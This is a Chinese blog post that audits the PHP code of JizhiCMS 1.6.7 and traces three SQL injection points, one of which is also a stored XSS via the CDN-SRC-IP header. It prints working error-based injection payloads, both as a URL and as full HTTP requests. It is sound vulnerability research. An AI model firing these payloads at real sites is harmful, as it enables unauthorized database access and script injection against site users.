\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MjM5NDUxMTI2NA==&mid=2247484599&idx=1&sn=2e14ee08659c761bb99ea95ba8c6fa95&chksm=a687e47891f06d6ecba03b45779157736d7760a097cccde74790b95e02a1306256d876076193&scene=126&sessionid=1602140929&key=4cf40c946f4d610c619e019c63059a44ab6d06a8d17c8c6f146906a12af69aded7c0d71e58b7f270145b3198f0bad739acca13b0e5c2123bda03ebce445ac29631a94be02614bb0fca7f60f9143a1d76d0c309bf65bd1cd66b8055f6a202895b7ea3414d4b5b5dfa6f7d692d252b3eac2f096f9c0a526b4dd40e3abcbb470933&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=62090529&lang=zh\_CN&exportkey=AbHVPpfVNXuWCcc%2FmJA9%2FEE%3D&pass\_ticket=MIT9gkwI%2Flz0hRXozp3zz%2FJGT8%2BgZgLCOBodXSLzGMJddkuYKwJy1I14m7NOwIdt&wx\_header=0)

**一、前言**

最近在学习 php 代码审计，在 cnvd 发现极致 cms 中 sql 注入问题挺多的，本文针对极致 cms1.6.7 进行多处 sql 注入审计。可能存在部分理解偏差的地方，还请师傅们指正。

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsdGm6T1Y2IbtUgqJIe9V3s6J9d8myHfNOqCeBMwvqaJZHQuibPSibKEHQ/640?wx_fmt=png)

```
cms下载链接：
https://www.jizhicms.cn/thread-95-1-1.html
```

**二、目录结构**  

```
├── 404.html
├── A后台控制文件
├── Conf公共函数
├── FrPHP框架
├── Home前台控制文件
├── Public公共静态文件
├── README.md
├── admin.php后台入口
├── backup备份
├── cache缓存
├── favicon.ico
├── index.php前台入口
├── install
├── readme.txt
├── static静态文件
└── web.config
```

  
**三、函数**

**1\. 过滤函数 frparam()**

此 cms 大量调用了 frparam() 函数 (\\FrPHP\\lib\\Controller.php)，函数代码：  

```
// 获取URL参数值
public function frparam($str=null, $int=0,$default = FALSE, $method = null){       
    $data = $this->\_data;
    if($str===null) return $data;
    if(!array\_key\_exists($str,$data)){
        return ($default===FALSE)?false:$default;
    }
  
    if($method===null){
        $value = $data\[$str\];
    }else{
        $method = strtolower($method);
        switch($method){
            case 'get':
            $value = $\_GET\[$str\];
            break;
            case 'post':
            $value = $\_POST\[$str\];
            break;
            case 'cookie':
            $value = $\_COOKIE\[$str\];
            break;        
        } 
    }   
    return format\_param($value,$int);
}
```

跟进`函数format_param()`  

```
function format\_param($value=null,$int=0){
    if($value==null){ return '';}
    switch ($int){
        case 0://整数
            return (int)$value;
        case 1://字符串
            $value=htmlspecialchars(trim($value), ENT\_QUOTES);
            if(!get\_magic\_quotes\_gpc())$value = addslashes($value);
            return $value;
        case 2://数组
            if($value=='')return '';
            array\_walk\_recursive($value, "array\_format");
            return $value;
        case 3://浮点
            return (float)$value;
        case 4:
            if(!get\_magic\_quotes\_gpc())$value = addslashes($value);
            return trim($value);
    }
}
```

可以看出，`format_param()`函数将传递进来的`$value`变量进行字符类型判断然后做相应的处理。总之：该函数将输入变量进行了过滤。

**2.sql 处理函数 update()**  

--------------------------

文件路径：jizhicms\_Beta1.6.7\\FrPHP\\lib\\Model.php

```
// 修改数据
    public function update($conditions,$row){
        $where = "";
        $row = $this->\_\_prepera\_format($row);
        if(empty($row))return FALSE;
        if(is\_array($conditions)){
            $join = array();
            foreach( $conditions as $key => $condition ){
                $condition = '\\''.$condition.'\\'';
                $join\[\] = "{$key} = {$condition}";
            }
            $where = "WHERE ".join(" AND ",$join);
        }else{
            if(null != $conditions)$where = "WHERE ".$conditions;
        }
        foreach($row as $key => $value){
            if($value!==null){
                $value = '\\''.$value.'\\'';
                $vals\[\] = "{$key} = {$value}";
            }else{
                $vals\[\] = "{$key} = null";
            }
        }
        $values = join(", ",$vals);
        $table = self::$table;
        $sql = "UPDATE {$table} SET {$values} {$where}";
        return $this->runSql($sql);  
    }
```

函数首先进行 sql 查询 (`$sql = "SELECT {$fields} FROM {$table} {$where}"`)，然后进行`return $this->db->getArray($sql);`的操作，跟进 `getArray()`函数：

```
//执行SQL语句返回数组
    public function getArray($sql){
        if(!$result = $this->query($sql))return array();
        if(!$this->Statement->rowCount())return array();
        $rows = array();
        while($rows\[\] = $this->Statement->fetch(PDO::FETCH\_ASSOC)){}
        $this->Statement=null;
        array\_pop($rows);
        return $rows;
    }
```

继续跟进到`query()`函数，第 8 行：  

```
$msg=$this->pdo->errorInfo();
```

也就是说这里会在错误的情况下会输出报错页面。

```
//执行SQL语句并检查是否错误
    public function query($sql){
        $this->filter\[\] = $sql;
        $this->Statement = $this->pdo->query($sql);
        if ($this->Statement) {
            return $this;
        }else{
            $msg = $this->pdo->errorInfo();
            if($msg\[2\]) exit('数据库错误：' . $msg\[2\] . end($this->filter));
        }
    }
```

**4.sql 处理函数 find()**
---------------------

`find()`函数与`findAll()`的区别就是 find 函数只查询一条数据。

```
// 查询一条
    public function find($where=null,$order=null,$fields=null,$limit=1){
       if( $record = $this->findAll($where, $order, $fields, 1) ){
            return array\_pop($record);
        }else{
            return FALSE;
        }
    }
```

**5.sql 处理函数 add()**
--------------------

`add()`函数会进行数据新增，总体来讲都会调用到`runsql()`函数，具体代码如下：  

```
// 新增数据
  public function add($row){
     if(!is\_array($row))return FALSE;
      $row = $this->\_\_prepera\_format($row);
      if(empty($row))return FALSE;
      foreach($row as $key => $value){
          if($value!==null){
              $cols\[\] = $key;
              $vals\[\] = '\\''.$value.'\\'';
          }
      }
      $col = join(',', $cols);
      $val = join(',', $vals);
      $table = self::$table;
      $sql = "INSERT INTO {$table} ({$col}) VALUES ({$val})";
      if( FALSE != $this->runSql($sql) ){
          if( $newinserid = $this->db->lastInsertId() ){
              return $newinserid;
          }else{
              $a=$this->find($row, "{$this->primary} DESC",$this->primary);
              return array\_pop($a);
          }
      }
      return FALSE;
  }
```

  
**四、审计思路**
=============

可以发现这个 cms 的主要过滤函数是`frparam()`，进行 sql 处理的函数并没有对相应的参数进行过滤，并且都会通过`以下处理流程进行报错输出：  
`

```
$msg = $this->pdo->errorInfo();
```

如果在进行 sql 处理的时候没有将传递的参数通过`frparam()`函数进行过滤，会造成 sql 注入。即此 cms 存在 sql 注入的必要条件：

*   有调用`update()、add()、find()`等函数
    
*   存在可控参数
    
*   不存在过滤函数  
    

本次审计只要针对 cms 前台页面，不涉及网站后台，所以可以把目录缩小到`/home/c`目录下。然后结合 xdebug 进行调试。

**五、sql 注入**  

**1、第一处注入**：

```
http://127.0.0.1/index.php?id=1'and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20'1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjstzn3OQSpSLg9hlABu0LcCibZibRU0uObCqkhfkKVu8PKS2rKwichLic06Q/640?wx_fmt=png)

这个漏洞点在 \\ Home\\c\\HomeController.php 文件下的 jizhi() 函数。代码太长这里就不贴了，简易分析`jizhi()`函数。首先可以跟进注释来理解，就先接受前台的请求，做了一个简易的处理，在这没有对相关参数进行过滤。

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjs9dydIkunKdVvQjkCdjJXPhuJDg0b3cZ0hiarjNzTaib6W3dvudia1zJAw/640?wx_fmt=png)

然后会进行多个 if 判断，传递参数的顺寻大致所以如下图`。`最后执行到 89 行`：  
`

```
$res = M('classtype')->find(array('htmlurl'=>$html));
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjswOBdsAHLa42G5UQ0Nh0MwqXDuBWL2ybV5fY5qc2IvH57J2GZXA2iaqQ/640?wx_fmt=png)

接下来的流程：`find()->findAll()->getArray()->query()`  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsAyHjpM4nlTVqDQ0YfBcuicibiaIwOicEriby2qVDzBPCFa72aB3JTIFfm7g/640?wx_fmt=png)

最后在 \\ Home\\c\\ErrorController.php 下进行输出：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsTF9Nk6P909MkvwJMPkaFIpozQW1D9BLBC3RLq8IXYeibkib9tOmWvNJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsgWI6VMffM5cDaJ3RZITYiaocBclFCD7Dvd5c6Jibw38l8tnloTL4N9RQ/640?wx_fmt=png)

**2\. 第二处注入 & 存储 XSS**
----------------------

第二个漏洞是 cms 的留言功能，在`\Home\c\MessageController.php`下的`index()`函数，代码：

```
/\*\*太长不贴\*\*/
```

前部分代码主要是对传送过来的数据进行值的接收然后过滤，在整个文件的第 41 行`：  
`

```
$w\['ip'\] = GetIP();
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsCwUVdYcicd3n1cNHj1rTqjEW7yxbnNW3dFhz16icVz5txeclqskDrTlw/640?wx_fmt=png)

跟进`GetIP()`函数 (\\FrPHP\\common\\ Functions.php）

```
function GetIP(){ 
    static $ip = '';
    $ip = $\_SERVER\['REMOTE\_ADDR'\];
    if(isset($\_SERVER\['HTTP\_CDN\_SRC\_IP'\])) {
      $ip = $\_SERVER\['HTTP\_CDN\_SRC\_IP'\];
    } elseif (isset($\_SERVER\['HTTP\_CLIENT\_IP'\]) && preg\_match('/^(\[0-9\]{1,3}\\.){3}\[0-9\]{1,3}$/', $\_SERVER\['HTTP\_CLIENT\_IP'\])) {
      $ip = $\_SERVER\['HTTP\_CLIENT\_IP'\];
    } elseif(isset($\_SERVER\['HTTP\_X\_FORWARDED\_FOR'\]) AND preg\_match\_all('#\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}#s', $\_SERVER\['HTTP\_X\_FORWARDED\_FOR'\], $matches)) {
      foreach ($matches\[0\] AS $xip) {
        if (!preg\_match('#^(10|172\\.16|192\\.168)\\.#', $xip)) {
          $ip = $xip;
          break;
        }
      }
    }
    return $ip;
  }
```

`GetIP()`是一个获取用户真实 IP 地址操作，在接入 cdn 的情况下获取真实源 ip 的。第 5 行 ：

```
$ip = $\_SERVER\['HTTP\_CDN\_SRC\_IP'\];
```

$ip 没有进行任何过滤，可以确认 IP 这个参数是可控的。回到整个`index()`函数继续向下走:

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjscrt6qh8J4EYWxEJYic3eBhJbxzt6GJBLtqicBD1PibCUvLoMF647aEgoA/640?wx_fmt=png)

第 97 行`$res = M('message')->add($w);`进行了一个 sql 的操作。由于在前面知道前面`GetIP()`函数处获取 IP 的地方过滤不完善，可以自己在请求头部构造一个`CDN-SRC-IP`即可造成 sql 注入。利用方法如下：

```
POST /message/index.html HTTP/1.1
Host: 192.168.0.107
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.107
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.107/msg.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=260dtl37k2itrt42glvgbfshp1
CDN-SRC-IP:2'and extractvalue(1,concat(0x5c,(select database()),0x5c)) and '1'='1
Connection: close

tid=4&user=1&title=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsSVSgLwuqNSSEGVicX6L7h4vCw0d29Q3Ijia7yR9KyfQ00SpqFdwLdkrA/640?wx_fmt=png)

既然这里参数没有过滤完善，后台如果看得到 ip 地址，那么这里应该也是可以造成 XSS 的。  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjssk3EFO0X9xEucKpicltT5TtNZY95p6iconBoyd9aKIibh4nViaD88PibQ7A/640?wx_fmt=png)

**3\. 第三处注入**
-------------

这个注入点在 jizhicms\_Beta1.6.7\\Home\\c\\UserController.php 下的 release() 函数下：

```
/\*函数代码太长不贴\*/      
```

**函数分析：**  

```
// 1.对post提交的表单数据进行取值
$data = $this->frparam();
// 2.然后对tid值进行了过滤
$w\['tid'\] = $this->frparam('tid');
```

在最后有发现此过滤无效：  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsLK2BrG9A5ibAo59oiaA2Ucj2diaEDvj8fkhGbSygrH6qibXehiceCtewicIQ/640?wx_fmt=png)

继续跟进发现在整个文件的第 957 行的这一段代码`：`  

```
$w = get\_fields\_data($data,$w\['molds'\]);
```

经过这个函数后，参数没有进行过滤，具体可以进行跟 \\ Conf\\Functions.php：`‍` 

```
 /\*太长不贴 \*/
```

整个函数主要问题是最后面的一个判断问题

```
if(array\_key\_exists($v\['field'\],$data)){

}
```

在 debug 的时候发现是没有用到值`$v['field']`，会直接执行`$data[$v['field']] = '';`造成 tid 参数过滤无效。  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsgibyADoZZkguUhZXJC6FhiccQAb16uFCcDboTuc3L8DogJdHpicCxqQ7w/640?wx_fmt=png)

  
返回 release() 函数，在 965 行进行一个 sql 的操作：

```
$fields\_list = M('Fields')->findAll($sql,'orders desc,id asc');
```

可以看到`$sql`变量是由 tid 和 molds 这两个参数组成的。这两个参数是都没有过滤的，所以这里存在注入。  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsqzojKRu3NTWUzsfBSUHfDqtmYpE6sJpib3V0pbKBevwbxbuhgHD5jjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsYrVDBHPeVhZO7KWvfyFYWU7mibRtac52lia7Hb2CbOAYic2y3b81AFhXw/640?wx_fmt=png)

然后将参数重新设置后，后面就主要是对内容标题等参数的过滤和判空等等，继续跟到后面整个文件的第 1035 行这里进行了一个`if…else`的操作。  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjs3jWJicIoWmyfX5vLgjD1J8iabHHELbfqjsW665icySia2j9Hicjy09ibf5dA/640?wx_fmt=png)

无论如何这里都会触发 sql 注入，本身对 id 这个参数是不存在过滤。

在发布文章的时候，触发以下内容将会造成 sql 注入：

```
$a = M($w\['molds'\])->add($w);
```

修改文章：  

```
$a = M($w\['molds'\])->update(\['id'=>$this->frparam('id')\],$w);
```

由于这里`$w`变量是直接接收前面的值，不存在过滤，所以同样也会造成 sql 注入。利用 post 数据包：

```
POST /user/release.html HTTP/1.1
Host: 192.168.0.111
Content-Length: 136
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111/user/release.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=or47icmjn28rlqojj35trmgik3
Connection: close

id=&isshow=&molds=article&tid=2&title=1&keywords=1&litpic=&file\_litpic=&description=1&submit=%E6%8F%90%E4%BA%A4&body=%3Cp%3E1%3C%2Fp%3E
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5Vicjsic7IIRMOYsxaW90JP0C9NGcFicolQXq2R82UYXjgHCHAIsfGPYM5kcGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsN7A1OvQFMaNJTGmcBrsJBYCiajjOGhD0JRnP6x6u4hZ4HJtVzZ6cGFw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsiaeFMaxss9FWfcxK05iaKmlV6dx3KamMqFnbf9Q5Mh8ZRicdBwtWALeaQ/640?wx_fmt=png)

**Post 数据包 2:**  

```
POST /user/release/id/57/molds/article.html HTTP/1.1
Host: 192.168.0.111
Content-Length: 231
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111/user/release/id/57/molds/article.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=or47icmjn28rlqojj35trmgik3
Connection: close

id=57&isshow=0&tid=2&title=1%27&keywords=1%27'&litpic=&file\_litpic=&description=1%27&submit=%E6%8F%90%E4%BA%A4&body=%3Cp%3E1%26%2339%3B%3C%2Fp%3E
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsSUYTggeejy3g7nYLRWnhT7HPIibN5kmbtxmpaEBTZQogIKFdEFFnV4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ6juEUFVCyZBbuk8p5VicjsmDYqq79leXYMAG3Nzjeib0q2jwticT7zm6HWj5jkaDyaH6dias3GJSNcA/640?wx_fmt=png)

**六、 总结**
=========

1\. 这个 cms 学习审计还是挺有意思的，代码本身不算特别复杂，由于进行 sql 处理的函数是没有对参数进行过滤的，也就导致审计注入的时候主要是注意有没有被`frparam()`函数进行过滤。

2\. 留言获取 ip 的功能也挺有趣的，由于对 ip 过滤不完善，导致产生 sql 和 xss 漏洞：

```
$ip = $\_SERVER\['HTTP\_CDN\_SRC\_IP'\];，
```

3\. 最后就是`release()`函数下假装过滤参数实际又没能生效：

```
$w = get\_fields\_data($data,$w\['molds'\]);
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbR2Yv9TcWTT1m4QCNyjOyVtBqws6CUXKibuTicnNt2dvawsjhoiaYQ5Q2G605Xkwaz5iaNWQJvfvyX9g/640?wx_fmt=jpeg)